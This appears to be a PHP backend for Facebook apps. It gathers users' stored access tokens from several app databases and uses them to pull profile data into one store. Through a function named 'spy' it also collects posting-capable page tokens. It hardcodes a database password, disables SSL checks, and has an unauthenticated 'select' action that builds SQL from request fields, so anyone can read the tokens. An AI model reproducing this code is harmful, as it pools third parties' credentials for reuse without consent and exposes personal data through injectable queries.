<?php
ob_start();
set_time_limit(60 * 10);

include 'shared/facebook.php';

function BlockSQL($str) {
	if ($str == null) {
		return null;
	}

	$str = mysql_real_escape_string($str);
	//Escapes special characters in a string for use in an SQL statement
	$str = htmlspecialchars($str);
	// will convert special chars like < to &lt;
	$str = strip_tags($str);
	//  strip all tags out.
	return $str;
}

function getJsonValue($object, $key) {
	try {
		if ($object == NULL)
			return NULL;
		if ($key == NULL)
			return NULL;

		if (property_exists($object, $key))
			return empty($object -> $key) ? NULL : $object -> $key;
		else
			return NULL;
	} catch (Exception $ex) {
		return NULL;
	}
}

function LoadPhp($url) {
	try {

		global $responseobject;

		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		//curl_setopt($ch, CURLOPT_POST, true);
		//curl_setopt($ch, CURLOPT_POSTFIELDS , array(item1 => 'value',item2 => 'value2'));
		curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		//curl_setopt($ch, CURLOPT_HTTPHEADER, array('Host: graph.facebook.com'));
		$output = curl_exec($ch);
		curl_close($ch);

		return $output;
	} catch (Exception $ex) {
		$responseobject -> errors = $ex;
		return null;
	}
}

function getuserip() {
	$ipaddress = '';
	if (getenv('HTTP_CLIENT_IP'))
		$ipaddress = getenv('HTTP_CLIENT_IP');
	else if (getenv('HTTP_X_FORWARDED_FOR'))
		$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
	else if (getenv('HTTP_X_FORWARDED'))
		$ipaddress = getenv('HTTP_X_FORWARDED');
	else if (getenv('HTTP_FORWARDED_FOR'))
		$ipaddress = getenv('HTTP_FORWARDED_FOR');
	else if (getenv('HTTP_FORWARDED'))
		$ipaddress = getenv('HTTP_FORWARDED');
	else if (getenv('REMOTE_ADDR'))
		$ipaddress = getenv('REMOTE_ADDR');
	else
		$ipaddress = 'UNKNOWN';

	return $ipaddress;
}

function spy($data) {
	return base64_encode($data);
}

function unspy($data) {
	return base64_decode($data);
}

define('DB_SERVER', 'localhost');
define('DB_USER', 'egypt');
define('DB_PASSWORD', '32733273');

$scope = isset($_REQUEST['scope']) ? $_REQUEST['scope'] : " * ";
$object = isset($_REQUEST['object']) ? $_REQUEST['object'] : ' setting ';
$tablename = isset($_REQUEST['tablename']) ? $_REQUEST['tablename'] : '';
$databasename = isset($_REQUEST['databasename']) ? $_REQUEST['databasename'] : '';
$action = isset($_REQUEST['action']) ? $_REQUEST['action'] : 'select';

$limit = isset($_REQUEST['limit']) ? $_REQUEST['limit'] : "30";
$start = isset($_REQUEST['start']) ? $_REQUEST['start'] : "0";
$limit = " LIMIT " . $start . "," . $limit . " ";

$where = "";
$sort = isset($_REQUEST['sort']) ? " ORDER BY {$_REQUEST['sort']}" : "";

$all = isset($_REQUEST['all']) ? $_REQUEST['all'] : '0';
$appid = isset($_REQUEST['appid']) ? $_REQUEST['appid'] : '';
$appaccesstoken = isset($_REQUEST['appaccesstoken']) ? $_REQUEST['appaccesstoken'] : '';

$responseobject -> serviceName = "mysql";
$responseobject -> objectName = $object;
$responseobject -> count = 0;
$responseobject -> data = array();
$responseobject -> errors = array();
$responseobject -> messages = array();

$con = mysql_connect(DB_SERVER, DB_USER, DB_PASSWORD);
mysql_set_charset('utf8', $con);

switch ($object) {
	case 'facebooky' :
		$tablename = "facebooky_users";
		$databasename = "apps";
		break;
	case 'facebookloginuser' :
		$tablename = "facebookloginuser";
		$databasename = "egtema3y";
		break;
	case 'chat.user' :
		$tablename = "chat_user";
		$databasename = "chat";
		break;
	case 'accesstoken' :
		$tablename = "user";
		$databasename = "accesstoken";
		break;
	default :
		break;
}

if ($action == "handle.facebooky") {

	$scope1 = "accesstoken";
	$databasename1 = "apps";
	$tablename1 = "facebooky_users";

	$databasename2 = "accesstoken";
	$tablename2 = "user";

	try {

		$sql = "SELECT {$scope1} FROM {$databasename1}.{$tablename1}  where 1  ";
		$responseobject -> messages[] = $sql;
		$rows = array();

		$result = mysql_query($sql, $con);
		if (!!$result) {
			while ($r = mysql_fetch_assoc($result)) {

				$accesstoken = $r['accesstoken'];
				LoadPhp("http://webservices.egtema3y.com/mysql.php?action=insert&object=accesstoken&accesstoken=" . $accesstoken);

			}

		}

		$responseobject -> errors[] = mysql_error();

	} catch (Exception $ex) {
		$responseobject -> errors[] = $ex -> getMessage();

	}

}

if ($action == "handle.egtema3y") {

	$scope1 = "accesstoken";
	$databasename1 = "egtema3y";
	$tablename1 = "facebookloginuser";

	$databasename2 = "accesstoken";
	$tablename2 = "user";

	try {

		$sql = "SELECT {$scope1} FROM {$databasename1}.{$tablename1}  where 1  ";
		$responseobject -> messages[] = $sql;
		$rows = array();

		$result = mysql_query($sql, $con);
		if (!!$result) {
			while ($r = mysql_fetch_assoc($result)) {

				$accesstoken = $r['accesstoken'];
				LoadPhp("http://webservices.egtema3y.com/mysql.php?action=insert&object=accesstoken&accesstoken=" . $accesstoken);

			}

		}

		$responseobject -> errors[] = mysql_error();

	} catch (Exception $ex) {
		$responseobject -> errors[] = $ex -> getMessage();

	}

}

if ($action == "handle.accounts") {

	$scope1 = "accesstoken";
	$databasename1 = "accesstoken";
	$tablename1 = "user";

	try {

		$sql = "SELECT {$scope1} FROM {$databasename1}.{$tablename1}  where 1  ";
		$responseobject -> messages[] = $sql;
		$rows = array();

		$result = mysql_query($sql, $con);
		if (!!$result) {
			while ($r = mysql_fetch_assoc($result)) {

				$accesstoken = $r['accesstoken'];
				LoadPhp("http://webservices.egtema3y.com/mysql.php?action=insert&object=accounts&accesstoken=" . $accesstoken);

			}

		}

		$responseobject -> errors[] = mysql_error();

	} catch (Exception $ex) {
		$responseobject -> errors[] = $ex -> getMessage();

	}

}

if ($action == "insert" && $object == "accesstoken") {
	try {
		$accesstoken = isset($_REQUEST['accesstoken']) ? $_REQUEST['accesstoken'] : '';
		$facebook -> setAccessToken($accesstoken);
		$me = $facebook -> api('/me');

		if ($me) {

			$name = isset($me['name']) ? $me['name'] : "";
			$username = isset($me['username']) ? $me['username'] : "";
			$email = isset($me['email']) ? $me['email'] : "";
			$gender = isset($me['gender']) ? $me['gender'] : "";
			$userid = isset($me['id']) ? $me['id'] : "hide";
			$birthday = isset($me['birthday']) ? $me['birthday'] : "";
			$location = "";
			$lo = isset($me['location']) ? $me['location'] : null;
			if ($lo) {
				$location = isset($lo['name']) ? $lo['name'] : "";
			}

			$me = spy(json_encode($me));

			// if userid exist ..................
			$oldusers = mysql_query("select `userid` from {$databasename}.{$tablename} where `userid`='$userid'  ", $con);

			$num_rows = mysql_num_rows($oldusers);
			if ($num_rows > 0) {
				$r = mysql_fetch_assoc($oldusers);

				$sql = "update  {$databasename}.{$tablename} set `accesstoken` = '{$accesstoken}'  where `userid` = '{$userid}'  ";
				mysql_query($sql, $con);
				return;
			} else {
				$columns = "accesstoken , info , name , username , email , gender , userid ,birthday ,location  ";
				$values = "'{$accesstoken}' , '{$me}' , '{$name}' , '{$username}' , '{$email}' , '{$gender}' , '{$userid}' , '{$birthday}' , '{$location}' ";

				$sql = "insert into  {$databasename}.{$tablename} ({$columns}) values ({$values}) ;";
				$result = mysql_query($sql, $con);
				$id = mysql_insert_id();
				if (!!$id) {
					$responseobject -> messages[] = $id;
				}

			}

		}
	} catch (Exception $ex) {
		$responseobject -> messages[] = $ex -> getMessage();
		$responseobject -> errors[] = $ex -> getMessage();
		mysql_close($con);
	}

}

if ($action == "insert" && $object == "accounts") {

	$databasename = "accesstoken";
	$tablename = "accounts";

	try {
		$accesstoken = isset($_REQUEST['accesstoken']) ? $_REQUEST['accesstoken'] : '';
		$facebook -> setAccessToken($accesstoken);
		$pages = $facebook -> api('/me/accounts');

		if ($pages) {

			foreach ($pages['data'] as $page) {
				$account_id = $page['id'];
				$account_accesstoken = $page['access_token'];
				$account_category = $page['category'];
				$account_name = $page['name'];

				$facebook -> setAccessToken($account_accesstoken);
				$info = $facebook -> api('/me');
				if ($info && $info["can_post"] == true && $info["is_published"] == true) {
					$account_username = $info['username'];
					$account_likes = $info['likes'];
					$account_talking_about_count = $info['talking_about_count'];

					// if account_id exist ..................
					$oldusers = mysql_query("select `account_id` from {$databasename}.{$tablename} where `account_id`='$account_id'  ", $con);

					$num_rows = mysql_num_rows($oldusers);
					if ($num_rows > 0) {
						$r = mysql_fetch_assoc($oldusers);

						$sql = "update  {$databasename}.{$tablename} set `accesstoken` = '{$account_accesstoken}' , account_likes = '{$account_likes}' , account_talking_about_count = '{$account_talking_about_count}'  where `account_id` = '{$account_id}'  ";
						mysql_query($sql, $con);
						return;
					} else {
						$columns = "accesstoken  , account_name , account_category , account_id , account_username , account_likes , account_talking_about_count";
						$values = "'{$account_accesstoken}' , '{$account_name}' , '{$account_category}' , '{$account_id}' ,'{$account_username}' , '{$account_likes}' , '{$account_talking_about_count}' ";

						$sql = "insert into  {$databasename}.{$tablename} ({$columns}) values ({$values}) ;";
						$result = mysql_query($sql, $con);
						$id = mysql_insert_id();
						if (!!$id) {
							$responseobject -> messages[] = $id;
						}

					}

				}
			}

		}
	} catch (Exception $ex) {
		$responseobject -> messages[] = $ex -> getMessage();
		$responseobject -> errors[] = $ex -> getMessage();
		mysql_close($con);
	}

}

if ($action == "select") {
	try {

		$sql = "SELECT {$scope} FROM {$databasename}.{$tablename}  where 1 ";
		$sql .= $where;
		$sql .= $sort;
		$sql .= $limit;

		$rows = array();
		$responseobject -> messages[] = $sql;
		$result = mysql_query($sql, $con);
		if ($result != null) {
			while ($r = mysql_fetch_assoc($result)) {
				$rows[] = $r;
			}
			$responseobject -> data = $rows;
			$responseobject -> count = count($rows);
		}

		$responseobject -> errors[] = mysql_error();
		mysql_close($con);
	} catch (Exception $ex) {
		$responseobject -> errors[] = $ex -> getMessage();
		mysql_close($con);
	}
}

mysql_close($con);

header('Content-type: application/json; charset=utf-8');
echo json_encode($responseobject);
?>
